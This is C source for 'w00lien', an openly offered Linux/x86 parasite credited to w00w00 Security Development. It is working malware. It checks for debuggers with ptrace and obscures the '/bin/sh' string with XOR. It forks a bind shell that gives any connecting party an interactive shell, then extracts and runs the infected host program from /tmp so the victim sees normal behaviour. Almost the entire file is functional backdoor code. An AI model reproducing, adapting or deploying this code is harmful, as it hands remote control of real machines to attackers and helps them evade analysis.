/* Copyright (C) 2002 w00w00 Security Development (WSD) 
 *                                    -  w00lien v0.0.3 
 *   
 *   This is a simple parasite for linux/86 systems,
 * use it with care, make sure to read the README for 
 * more details. Have a nice night heh ;) 
 *
 * www.w00w00.org - w00w00 Security Development (WSD)
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/user.h>

#include "ebola.h"                                          /* here we define parasite's filesize */

#ifdef SILENT
#define XOR_SELF         22  
#define SPATH            "\x39\x74\x7f\x78\x39\x65\x7e"     /* Our /bin/sh encrypted heh ;)     */
#endif


#define  TEMP             "/tmp/.para.tmp"                  /* tmp file, remove it after        */
#define  KILL(X)          exit(1)                

int soc,cli;
struct sockaddr_in serv_addr;


#ifdef SILENT
/* Our dex0r function for decrypting heh ;) */
char *
dex0r(char *str)
{
  static char *buf;
  int c;
 
  if (buf == NULL)
       buf = malloc(1024);
 
  for (c=0; c < strlen(str); c++)
       buf[c] = str[c]^XOR_SELF;
  buf[strlen(str)] = '\0';
  return(buf);
}
#endif


int main(int argc, char *argv[], char *envp[])
{
        int input, output,lenght;
    
        char *dope;
        struct stat stat;
        
        /* Anti-Debugging trick */
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
        {
        printf("\n\n *** Debugging detected??... FUCK!!! \n\n");
        return(1);
        }

/* SILENT mode, some simple encryption */
#ifdef SILENT 
        /* let's fork */
        if(fork()==0) /* start of the portshell */
        {
        serv_addr.sin_family=2;
        serv_addr.sin_addr.s_addr=0;
        serv_addr.sin_port=(0x7350);
        soc=socket(2,1,6);
        bind(soc,(struct sockaddr *)&serv_addr,0x10);
        listen(soc,1);
        cli=accept(soc,0,0);
        dup2(cli,0);
        dup2(cli,1);
        dup2(cli,2);
        execl(dex0r(SPATH),"PS",(char*)0);
        }
#endif

/* SINGLE mode no extra encryption */
#ifdef SINGLE
        /* let's fork */
        if(fork()==0) /* start of the portshell */
        {
        serv_addr.sin_family=2;
        serv_addr.sin_addr.s_addr=0;
        serv_addr.sin_port=(0x7350);
        soc=socket(2,1,6);
        bind(soc,(struct sockaddr *)&serv_addr,0x10);
        listen(soc,1);
        cli=accept(soc,0,0);
        dup2(cli,0);
        dup2(cli,1);
        dup2(cli,2);
        execl("/bin/sh","sh","-i",0);
        }
#endif
	input = open("/proc/self/exe", O_RDONLY);

	if (input < 0) 
        KILL("open(input)");

	if (fstat(input, &stat) < 0) 
        KILL("fstat");

	lenght = stat.st_size - PARASIZE;
	dope = malloc(lenght);
          
	if (dope == NULL) 
        KILL("malloc");
          
	if (lseek(input, PARASIZE, SEEK_SET) != PARASIZE) 
        KILL("lseek(input)");

	if (read(input, dope, lenght) != lenght) 
        KILL("read(input)");

	close(input);
	output = open(TEMP, O_RDWR | O_CREAT | O_TRUNC, stat.st_mode);

	if (output < 0) 
        KILL("open(output)");

	if (write(output, dope, lenght) != lenght) 
        KILL("write(output)");

	free(dope);
	close(output);

	exit(execve(TEMP, argv, envp));
}

